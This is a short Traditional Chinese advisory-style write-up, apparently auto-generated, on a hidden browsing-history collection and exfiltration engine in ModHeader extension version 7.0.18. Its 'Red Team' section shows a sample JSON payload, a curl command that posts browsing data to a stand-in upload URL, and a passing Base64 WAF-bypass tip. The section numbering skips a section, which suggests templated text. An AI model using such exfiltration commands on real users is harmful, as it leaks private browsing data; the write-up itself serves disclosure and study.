# 🔥 解析 ModHeader 擴充套件的隱藏瀏覽紀錄收集引擎
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `瀏覽紀錄收集`, `資料外傳`, `Chrome 擴充套件`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ModHeader 擴充套件的 7.0.18 版本中，包含了一個隱藏的瀏覽紀錄收集引擎，該引擎可以收集用戶的瀏覽資料，並將其加密儲存於本機。這個引擎預設的資料外傳通道為休眠狀態，但收集瀏覽紀錄與加密儲存的功能都正常運作。
* **攻擊流程圖解**: 
  1. 用戶安裝 ModHeader 擴充套件
  2. 擴充套件收集用戶的瀏覽資料
  3. 收集到的資料被加密儲存於本機
  4. 資料外傳通道在允許清單內容更新後被啟用
  5. 收集到的資料被上傳到指定網站
* **受影響元件**: ModHeader 擴充套件 7.0.18 版本，Chrome 和 Edge 瀏覽器

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝 ModHeader 擴充套件，且允許清單內容需要被更新
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload 結構
      payload = {
        "browser_data": {
          "url": "https://example.com",
          "title": "Example Website"
        }
      }
    
    ```
  *範例指令*: 使用 `curl` 命令上傳收集到的資料

```

bash
  curl -X POST -H "Content-Type: application/json" -d '{"browser_data": {"url": "https://example.com", "title": "Example Website"}}' https://example.com/upload

```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼或使用其他加密方法

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **瀏覽紀錄收集 (Browser Data Collection)**: 瀏覽器收集用戶的瀏覽資料，包括 URL、標題、cookie 等。
* **資料外傳 (Data Exfiltration)**: 將收集到的資料外傳到指定網站或伺服器。
* **Chrome 擴充套件 (Chrome Extension)**: Chrome 瀏覽器的擴充套件，可以增加瀏覽器的功能。
